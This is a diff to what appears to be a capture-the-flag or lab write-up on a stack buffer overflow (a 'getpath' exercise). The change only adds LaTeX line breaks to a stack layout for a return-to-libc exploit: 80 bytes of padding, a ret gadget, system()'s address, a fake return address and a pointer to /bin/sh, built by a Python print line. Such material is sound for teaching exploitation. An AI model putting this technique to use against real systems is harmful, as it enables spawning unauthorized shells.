@@ -515,11 +515,12 @@ print(padding + retAddress + systemAddress + paddingROP + shellAddress)
 
 The stack shall look as follows:
 $$
-Padding of 0xAA's = 80 bytes
-ret instruction in getpath (ret to .txt) = 0x8048544
-system address = 0xb7ecffb0
-fake system return address = 0xbbbbbbbb
-Pointer to /bin/sh = 0xb7fb63bf
+\\
+Padding of 0xAA's = 80 bytes \\
+ret instruction in getpath (ret to .txt) = 0x8048544 \\
+system address = 0xb7ecffb0 \\
+fake system return address = 0xbbbbbbbb \\
+Pointer to /bin/sh = 0xb7fb63bf \\
 $$ 
 ```
         +----------------+
